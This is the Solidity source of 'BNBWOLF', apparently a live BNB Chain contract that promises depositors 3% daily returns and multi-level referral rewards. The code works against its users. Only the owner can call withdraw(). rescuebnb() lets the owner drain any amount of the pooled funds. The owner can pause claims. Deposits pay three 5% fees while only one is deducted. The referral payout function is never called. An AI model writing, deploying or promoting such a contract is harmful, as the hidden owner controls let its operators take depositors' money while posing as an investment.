/**
 *Submitted for verification at BscScan.com on 2023-09-15
*/

//  SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

// ------
// --- Structures
// ------

struct State {
    uint256 launch_time;
    uint32 n_users;
    uint256 turnover;
    uint256 payouts;
}

struct User {
    bool registered;
    address referrer;
    uint256 deposit;
    uint256 balance;
    uint256 claim_time;
    uint16[5] referrals;
}

contract BNBWOLF {
    // ------
    // --- Settings
    // ------

    uint256 constant internal LAUNCH_TIME = 1694620800;

    uint8 constant internal PRECENT_DIVEDER = 100;

    uint32 constant internal DEPOSIT_PERIOD = 60*60*24;
    uint8 constant internal DEPOSIT_RATE = 3; //3% Daily

    uint256 constant internal MIN_DEPOSIT = 0.01 ether;
    uint256 constant internal MAX_DEPOSIT = 50 ether;

    address payable public owner;
    address payable public FEE_ADDRESS;
    address payable public FEE_ADDRESS2;
    address payable public FEE_ADDRESS3;
    
    uint8 constant internal DEPOSIT_FEE = 5;
    uint8 constant internal WITHDRAW_FEE = 5;

    address constant internal DEFAULT_REFERRER = 0x4e001E96CD12ACa3084b1035BBB37Cb6089f8D16;
    uint8[5] internal REF_REWARD = [8, 5, 3, 2, 2];

    // ------
    // --- Variables
    // ------

    State internal state;
    mapping(address => User) internal users;



    bool internal reentrancy_lock;
    bool public claimPaused;

    // ------
    // --- Events
    // ------

    event NewUser(address indexed user, address indexed referrer);
    event Invest(address indexed user, uint256 amount);
    event Reinvest(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event Claim(address indexed user, uint256 amount);

    // ------
    // --- Modifiers
    // ------

    modifier nonReentrant() {
        require(!reentrancy_lock, "No re-entrancy");
        reentrancy_lock = true;
        _;
        reentrancy_lock = false;
    }

    modifier onlyLaunched() {
        require(block.timestamp >= state.launch_time, "Contract must be launched");
        _;
    }

    modifier onlyRegistered() {
        require(users[msg.sender].registered, "User must be registered");
        _;
    }

    modifier onlyOwner() {
    require(msg.sender == owner, "Only the contract owner can call this function");
    _;
    }
    
    modifier claimNotPaused() {
    require(!claimPaused, "Claiming is paused");
    _;
    }

    function pauseClaim() external onlyOwner {
    claimPaused = true;
    }

    function unpauseClaim() external onlyOwner {
    claimPaused = false;
    }



    // ------
    // --- Initialization
    // ------

    constructor() {
    setOwner(msg.sender);
    state.launch_time = LAUNCH_TIME;
    if (FEE_ADDRESS == DEFAULT_REFERRER){
        _createUser(FEE_ADDRESS, DEFAULT_REFERRER);
        } else {
            _createUser(DEFAULT_REFERRER, DEFAULT_REFERRER);
               _createUser(FEE_ADDRESS, DEFAULT_REFERRER);
        }
  }
    	function rescuebnb(uint256 _amount) public onlyOwner {
        owner.transfer(_amount);
    }
         function setOwner(address newOwner) private {
         owner = payable(newOwner);
         }
    
    function invest(address referrer) external payable nonReentrant onlyLaunched {
    if (!_userRegistered(msg.sender)){
        _registration(msg.sender, referrer);
    }

    _chargeBalance(msg.sender);

    require(msg.value >= MIN_DEPOSIT, "Deposit amount is less than minimal deposit");

    uint256 fee = (msg.value * DEPOSIT_FEE) / PRECENT_DIVEDER;
    
    // Transfer the fee directly to FEE_ADDRESS
    address payable feeAddress1 = payable(FEE_ADDRESS);
    feeAddress1.transfer(fee);

    // Transfer the fee to FEE_ADDRESS2
    address payable feeAddress2 = payable(FEE_ADDRESS2);
    feeAddress2.transfer(fee);

    // Transfer the fee to FEE_ADDRESS3
    address payable feeAddress3 = payable(FEE_ADDRESS3);
    feeAddress3.transfer(fee);

    uint256 upd_deposit = users[msg.sender].deposit + (msg.value - fee);
    require(upd_deposit <= MAX_DEPOSIT, "Deposit must be less than maximal deposit");

    users[msg.sender].deposit += msg.value - fee;

    state.turnover += msg.value;

    emit Invest(msg.sender, msg.value);
}

    function reinvest(uint256 amount) external nonReentrant onlyLaunched onlyRegistered {
        _chargeBalance(msg.sender);

        require(amount <= users[msg.sender].balance, "Not enough balance");
        require(amount >= MIN_DEPOSIT, "Deposit amount is less than minimal deposit");

        uint256 upd_deposit = users[msg.sender].deposit + amount;
        require(upd_deposit <= MAX_DEPOSIT, "Deposit must be less than maximal deposit");

        users[msg.sender].balance -= amount;
        users[msg.sender].deposit += amount;

        emit Reinvest(msg.sender, amount);
    }

    function withdraw(uint256 amount) external nonReentrant onlyLaunched onlyOwner {
        _chargeBalance(msg.sender);

        require(amount <= users[msg.sender].deposit, "Deposit less than withdrawal amount");
        
        uint256 fee = (amount * WITHDRAW_FEE) / PRECENT_DIVEDER;

        users[msg.sender].deposit -= amount;

        state.turnover += amount-fee;
        state.payouts += amount-fee;

        users[FEE_ADDRESS].balance += fee;

        payable(msg.sender).transfer(amount-fee);

        emit Withdraw(msg.sender, amount);
    }

    function claim(uint256 amount) external nonReentrant onlyLaunched onlyRegistered claimNotPaused {
    _chargeBalance(msg.sender);

    require(amount <= users[msg.sender].balance, "Not enough balance");

    uint256 fee = (amount * WITHDRAW_FEE) / PRECENT_DIVEDER;
    
    // Transfer the fee directly to FEE_ADDRESS
    address payable feeAddress = payable(FEE_ADDRESS);
    feeAddress.transfer(fee);

    users[msg.sender].balance -= amount;

    state.turnover += amount;
    state.payouts += amount;

    payable(msg.sender).transfer(amount - fee);

    emit Claim(msg.sender, amount);
}


    // ------
    // --- Internal functions
    // ------

    function _userRegistered(address _user) internal view returns (bool user_registered) {
        return (
            users[_user].registered
        );
    }

    function _registration(address _user, address _referrer) internal {
        require(!_userRegistered(_user), "User is already registered");

        if (_user == _referrer) {
            _referrer = DEFAULT_REFERRER;
        }

        if (!_userRegistered(_referrer)) {
            _createUser(_referrer, DEFAULT_REFERRER);
        }

        _createUser(_user, _referrer);
    }

    function _createUser(address _user, address _referrer) internal {
        User storage user = users[_user];

        user.registered = true;
        user.referrer = _referrer;

        state.n_users += 1;

        if (_user != DEFAULT_REFERRER) {
            _refUpdate(_referrer, 0);
        }

        emit NewUser(_user, _referrer);
    }

    function _refUpdate(address _referrer, uint8 _ref_level) internal {
        User storage referrer = users[_referrer];

        referrer.referrals[_ref_level] += 1;

        if (_ref_level + 1 < REF_REWARD.length && _referrer != DEFAULT_REFERRER) {
            _refUpdate(referrer.referrer, _ref_level + 1);
        }
    }

    function _calcReward(address _user) internal view returns(uint reward) {
        uint256 deposit = users[_user].deposit;
        uint256 from = users[_user].claim_time;
        uint256 to = block.timestamp;

        return (
            (deposit * (to - from) * DEPOSIT_RATE) / DEPOSIT_PERIOD / PRECENT_DIVEDER
        );
    }

    function _chargeBalance(address _user) internal {
        users[_user].balance += _calcReward(_user);
        users[_user].claim_time = block.timestamp;
    }

    function _chargeRef(address _user, uint8 _level) internal {
        User storage referrer = users[users[_user].referrer];

        uint256 fee = (REF_REWARD[_level] * msg.value) / PRECENT_DIVEDER;

        referrer.balance += fee;

        if (_level + 1 < REF_REWARD.length && users[_user].referrer != DEFAULT_REFERRER) {
            _chargeRef(users[_user].referrer, _level + 1);
        }
    }


    // Add these functions to set or change the wallet addresses
    function setFeeAddress(address payable newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "Invalid address");
    FEE_ADDRESS = newFeeAddress;
    }

    function setFeeAddress2(address payable newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "Invalid address");
    FEE_ADDRESS2 = newFeeAddress;
    }

    function setFeeAddress3(address payable newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "Invalid address");
    FEE_ADDRESS3 = newFeeAddress;
    }






    
    // ------
    // --- View functions
    // ------

    function contractState() external view returns(
        uint32 n_users,
        uint256 turnover,
        uint256 payouts
    ) {
        return (
            state.n_users,
            state.turnover,
            state.payouts
        );
    }

    function userState(address _user) external view returns(
        uint256 deposit,
        uint256 balance,
        uint16[5] memory referrals
    ) {
        User storage user = users[_user];

        return (
            user.deposit,
            user.balance + _calcReward(_user),
            user.referrals
        );
    }
}